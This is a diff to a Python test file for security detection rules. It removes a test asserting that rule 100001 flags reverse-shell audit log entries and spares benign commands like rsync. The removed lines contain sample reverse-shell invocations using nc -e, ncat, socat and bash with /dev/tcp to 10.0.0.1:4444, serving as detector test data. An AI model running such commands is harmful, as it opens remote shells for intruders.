@@ -14,29 +14,6 @@ def rule_by_id(rid):
     return next(r for r in load_rules() if r.get("id") == rid)
 
 
-def test_100001_matches_netcat_exec_but_not_rsync():
-    pattern = next(p for _, _, p in pcre2_patterns(rule_by_id("100001")))
-    rx = re.compile(pattern)
-    hits = [
-        'type=EXECVE msg=audit(1.1:9): argc=3 a0="nc" a1="-e" a2="/bin/bash"',
-        'type=EXECVE argc=4 a0="/usr/bin/ncat" a1="10.0.0.1" a2="4444" a3="-e"',
-        'type=EXECVE argc=3 a0="socat" a1="-ve" a2="x"',
-        'type=EXECVE argc=4 a0="bash" a1="-i" a2=">&" a3="/dev/tcp/10.0.0.1/4444"',
-        'type=EXECVE argc=3 a0="/bin/sh" a1="-i" a2="/dev/tcp/10.0.0.1/4444"',
-    ]
-    misses = [
-        'type=EXECVE argc=3 a0="rsync" a1="-e" a2="ssh"',
-        'type=EXECVE argc=1 a0="sync"',
-        'type=EXECVE argc=2 a0="ncdu" a1="-e"',
-        'type=EXECVE argc=2 a0="nc" a1="-l"',
-        'type=EXECVE argc=3 a0="bash" a1="-c" a2="echo hi"',
-    ]
-    for line in hits:
-        assert rx.search(line), line
-    for line in misses:
-        assert not rx.search(line), line
-
-
 def test_100003_requires_exact_access_mask():
     rule = rule_by_id("100003")
     mask = next(p for t, n, p in pcre2_patterns(rule) if n == "win.eventdata.grantedAccess")
